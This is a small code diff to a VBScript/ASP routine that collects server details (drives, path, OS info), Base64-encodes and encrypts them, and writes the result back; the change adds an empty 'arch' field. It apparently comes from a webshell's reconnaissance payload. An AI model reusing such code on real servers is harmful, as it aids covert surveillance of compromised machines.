@@ -206,7 +206,7 @@ Sub main(arrArgs)
 		echo "</table><hr><br/>"
 		Set TheDrive=Nothing
 		Set Fso=Nothing
-		finalResult="{""basicInfo"":"""&Base64Encode(basicInfo)&""",""driveList"":"""&Base64Encode(driveList)&""",""currentPath"":"""&Base64Encode(currentPath)&""",""osInfo"":"""&Base64Encode(osInfo)&"""}"
+		finalResult="{""basicInfo"":"""&Base64Encode(basicInfo)&""",""driveList"":"""&Base64Encode(driveList)&""",""arch"":"" "",""currentPath"":"""&Base64Encode(currentPath)&""",""osInfo"":"""&Base64Encode(osInfo)&"""}"
 		Response.binarywrite(Encrypt(finalResult))
 		'Response.write(finalResult)
 End Sub
